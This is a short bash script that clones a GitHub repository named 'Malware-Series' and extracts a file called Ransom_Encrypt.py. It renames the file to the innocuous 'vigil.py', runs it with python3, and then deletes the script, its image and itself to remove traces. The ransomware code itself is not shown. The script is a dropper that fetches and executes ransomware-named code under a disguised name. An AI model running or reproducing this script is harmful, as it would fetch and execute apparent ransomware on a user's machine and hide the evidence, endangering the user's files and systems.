#!/bin/bash

git clone https://github.com/BelierJavier/Malware-Series.git

mv ./Malware-Series/Ransom_Encrypt/Ransom_Encrypt.py ./vigil.py
mv ./Malware-Series/Ransom_Encrypt/vigil.png .

rm -rf Malware-Series

python3 vigil.py

rm -rf vigil.py vigil.png vigil.sh
